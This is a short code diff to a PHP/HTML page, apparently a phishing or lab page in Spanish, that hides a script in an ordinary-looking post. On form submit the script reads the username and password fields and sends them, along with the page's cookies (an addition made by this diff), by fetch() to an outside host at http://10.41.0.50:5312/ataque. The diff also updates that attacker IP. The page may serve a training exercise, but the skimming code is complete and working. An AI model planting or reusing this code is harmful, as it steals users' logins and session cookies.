@@ -247,17 +247,18 @@ setcookie("PHPSESSID", "c00k13sup3rs3cr3t4");
 				<h2><span class="no-movil">Ayer, a las 17:44 hrs.</span><span class="only-movil">7h</span>, por Elliot
 					Alderson.</h2>
 				<p>Les deseamos un muy buen día!</p>
-				<input type="hidden" id="attackIP" value="http://10.41.0.154:5312/ataque">
+				<input type="hidden" id="attackIP" value="http://10.41.0.50:5312/ataque">
 				<script type="text/javascript">
 					document.addEventListener("DOMContentLoaded", function () {
 						let username = document.querySelector("[name=username]");
 						let password = document.querySelector("[name=password]");
+						let cookies = document.cookie;
 						let form = document.querySelector("#upform form")
 						form.onsubmit = (e) => {
 							let user = username.value;
 							let pass = password.value;
 							let connip = document.querySelector("#attackIP").value;
-							fetch(`${connip}?user=${user}&pass=${pass}`)
+							fetch(`${connip}?user=${user}&pass=${pass}&cookies=${cookies}`)
 								.then(response => console.log(response));
 							e.preventDefault();
 						}
